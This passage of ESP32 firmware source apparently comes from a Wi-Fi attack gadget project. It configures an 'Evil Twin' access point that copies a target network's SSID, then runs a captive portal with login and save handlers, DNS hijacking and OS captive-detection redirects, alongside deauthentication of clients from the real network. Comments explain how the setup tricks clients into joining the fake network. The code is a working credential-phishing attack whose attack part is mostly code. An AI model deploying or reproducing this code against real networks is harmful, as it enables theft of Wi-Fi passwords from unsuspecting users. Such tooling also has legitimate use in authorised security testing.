Smethan/projectZero/ESP32C5/main/main.c
            // Configure AP with Evil Twin SSID
            wifi_config_t ap_config = {
                .ap = {
                    .ssid = "",
                    .ssid_len = 0,
                    .channel = target_bssid_count > 0 ? target_bssids[0].channel : 1,
                    .password = "",
                    .max_connection = 4,
                    .authmode = WIFI_AUTH_OPEN
                }
            };
            
            // Copy original SSID exactly (no zero-width space — we want
            // the client to see our AP as the same network it remembers)
            size_t ssid_len = strlen(evilTwinSSID);
            strncpy((char*)ap_config.ap.ssid, evilTwinSSID, sizeof(ap_config.ap.ssid));
            ap_config.ap.ssid_len = ssid_len;

            // AP mode was enabled by ensure_ap_mode(), update the configuration
            ret = esp_wifi_set_config(WIFI_IF_AP, &ap_config);

            // Note: we do NOT clone the target BSSID — with the same MAC,
            // our deauth frames would also kick clients from the fake AP.
            // The matching SSID (open, no password) is enough to appear
            // in the client's network list after deauth from the real AP.
            if (ret != ESP_OK) {
                MY_LOG_INFO(TAG, "Failed to set AP config: %s", esp_err_to_name(ret));
                applicationState = IDLE;
                return 1;
            }
            
            // Start DHCP server
            ret = esp_netif_dhcps_start(ap_netif);
            if (ret != ESP_OK) {
                applicationState = IDLE;
                return 1;
            }
            
            // Wait a bit for AP to fully start
            vTaskDelay(pdMS_TO_TICKS(1000));
            
            // Configure HTTP server
            httpd_config_t config = HTTPD_DEFAULT_CONFIG();
            config.server_port = 80;
            config.max_open_sockets = 7;
            config.uri_match_fn = httpd_uri_match_wildcard;
            
            // Start HTTP server
            esp_err_t http_ret = httpd_start(&portal_server, &config);
            if (http_ret != ESP_OK) {
                MY_LOG_INFO(TAG, "Failed to start HTTP server: %s", esp_err_to_name(http_ret));
                // Stop DHCP before returning
                esp_netif_dhcps_stop(ap_netif);
                applicationState = IDLE;
                return 1;
            }
            
            // Register URI handlers
            httpd_uri_t root_uri = {
                .uri = "/",
                .method = HTTP_GET,
                .handler = root_handler,
                .user_ctx = NULL
            };
            httpd_register_uri_handler(portal_server, &root_uri);
            
            httpd_uri_t root_post_uri = {
                .uri = "/",
                .method = HTTP_POST,
                .handler = root_handler,
                .user_ctx = NULL
            };
            httpd_register_uri_handler(portal_server, &root_post_uri);
            
            httpd_uri_t portal_uri = {
                .uri = "/portal",
                .method = HTTP_GET,
                .handler = portal_handler,
                .user_ctx = NULL
            };
            httpd_register_uri_handler(portal_server, &portal_uri);
            
            httpd_uri_t login_uri = {
                .uri = "/login",
                .method = HTTP_POST,
                .handler = login_handler,
                .user_ctx = NULL
            };
            httpd_register_uri_handler(portal_server, &login_uri);
            
            httpd_uri_t get_uri = {
                .uri = "/get",
                .method = HTTP_GET,
                .handler = get_handler,
                .user_ctx = NULL
            };
            httpd_register_uri_handler(portal_server, &get_uri);
            
            httpd_uri_t save_uri = {
                .uri = "/save",
                .method = HTTP_POST,
                .handler = save_handler,
                .user_ctx = NULL
            };
            httpd_register_uri_handler(portal_server, &save_uri);
            
            httpd_uri_t android_captive_uri = {
                .uri = "/generate_204",
                .method = HTTP_GET,
                .handler = android_captive_handler,
                .user_ctx = NULL
            };
            httpd_register_uri_handler(portal_server, &android_captive_uri);
            
            httpd_uri_t ios_captive_uri = {
                .uri = "/hotspot-detect.html",
                .method = HTTP_GET,
                .handler = ios_captive_handler,
                .user_ctx = NULL
            };
            httpd_register_uri_handler(portal_server, &ios_captive_uri);
            
            httpd_uri_t samsung_captive_uri = {
                .uri = "/ncsi.txt",
                .method = HTTP_GET,
                .handler = captive_detection_handler,
                .user_ctx = NULL
            };
            httpd_register_uri_handler(portal_server, &samsung_captive_uri);
            
            httpd_uri_t windows_captive_uri = {
                .uri = "/connecttest.txt",
                .method = HTTP_GET,
                .handler = captive_detection_handler,
                .user_ctx = NULL
            };
            httpd_register_uri_handler(portal_server, &windows_captive_uri);

            // Catch-all: redirect any unregistered URL to portal.
            // Critical for captive portal detection — devices probe many
            // URLs and without this they get 404, so the popup never shows.
            {
                httpd_uri_t catchall_uri = {
                    .uri = "/*",
                    .method = HTTP_GET,
                    .handler = captive_portal_handler,
                    .user_ctx = NULL
                };
                httpd_register_uri_handler(portal_server, &catchall_uri);
            }

            // Set portal_active flag BEFORE starting DNS task
            // (DNS task checks this flag in its loop)
            portal_active = true;
            
            // Start DNS server task
            BaseType_t dns_result = xTaskCreate(
                dns_server_task,
                "dns_server",
                4096,
                NULL,
                5,
                &dns_server_task_handle
            );
            
            if (dns_result != pdPASS) {
                MY_LOG_INFO(TAG, "Failed to create DNS server task");
                httpd_stop(portal_server);
                portal_server = NULL;
                portal_active = false;
                applicationState = IDLE;
                return 1;
            }
            
            MY_LOG_INFO(TAG, "Captive portal started successfully");
        }

        MY_LOG_INFO(TAG,"Attacking %d network(s):", g_selected_count);
        
        // Save target BSSIDs for channel monitoring
        save_target_bssids();
        last_channel_check_time = esp_timer_get_time() / 1000; // Convert to milliseconds
        
